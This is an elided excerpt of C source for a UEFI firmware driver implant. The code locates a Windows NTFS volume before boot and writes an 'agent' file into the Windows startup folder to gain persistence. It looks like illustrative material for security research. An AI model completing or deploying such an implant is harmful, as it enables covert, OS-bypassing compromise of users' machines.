  ...
  for (Index = 0; Index < DiskIoDeviceHandleCount; Index++) {
    for (Index2 = 0; Index2 < BlockIoDeviceHandleCount; Index2++) {
      if (BlockIoDeviceHandleBuffer[Index] == DiskIoDeviceHandleBuffer[Index2])
      {
        ...
        if (EFI_ERROR(Status))
        {
          Print(L"ERROR - ConnectController Status: %r\n", Status);
        }
      }
    }
  }
...
/*
FindWindowsDrive() looks for a drive that contains a Windows installation and returns a pointer to its root directory.
*/
EFI_STATUS
EFIAPI
FindWindowsDrive(
  ...
  )
{
  ...
  if (EFI_ERROR(Status)) {
    Print(L"ERROR - LocateHandleBuffer FileSystemProtocol Status: %r\n", Status);
  }

  for (Index = 0 ; Index < FileSystemHandleCount ; Index++) 
  {
    Print(L"File system iteration start, Index is:%d\n", Index);
    ...
    if (EFI_ERROR(Status)) 
	{
      Print(L"ERROR - OpenProtocol(gEfiSimpleFileSystemProtocolGuid): %r\n", Status);
      continue;
    }
    ...
    if (EFI_ERROR(Status)) 
	{
      Print(L"ERROR - OpenVolume(FileSystemProtocol, &RootDir); %r\n", Status);
      continue;
    }
    Print(L"OpenVolume(FileSystemProtocol, &RootDir); %r\n", Status);
    
    Status = (*RootDir)->Open((*RootDir), &WindowsDir, L".\\Windows", EFI_FILE_MODE_READ, 0);
    if (EFI_ERROR(Status))
    {
	  Print(L"ERROR - Open(\\Windows): %r\n", Status);
	  continue;
	}
...
/*
WriteTestFile writes a test file to a given directory using the File protocol.
*/
EFI_STATUS
EFIAPI
WriteTestFile(
  ...
  )
{
  ...
  else
  {
    ...
    if (EFI_ERROR(Status))
    {
      Print(L"ERROR - Could not write test file, status: %r\n", Status);
    }
    else
	{
...
/*
InstallAgent() writes a file to Windows startup folder, given a pointer to the file system root.
*/
EFI_STATUS
EFIAPI
InstallAgent(
  ...
  )
{
  ...
  Print(L"In InstallAgent\n");
  
  Status = RootDir->Open(RootDir, &StartupDir, StartupPath, EFI_FILE_MODE_READ, 0);
  if (EFI_ERROR(Status))
  {
    Print(L"ERROR - Open StartupDir: %r\n", Status);
  }
  else
  {
    Print(L"Opened StartupDir\n");
  
    Status = WriteTestFile(StartupDir);
    if (EFI_ERROR(Status))
    {
  	  Print(L"ERROR - WriteTestFile(StartupDir): %r\n", Status);
    }
...
/*
NtfsCallback() is the core of the driver implant. It makes sure the NTFS driver is connected to any controllers for disks with NTFS volumes, looks for a Windows file system, and installs an agent in the Windows startup folder.
*/
VOID
EFIAPI
NtfsCallback (
...
/*
NtfsEntryPoint() initializes the NTFS driver and registers a callback 
for the ready-to-boot event.
*/
EFI_STATUS
EFIAPI
NtfsEntryPoint (
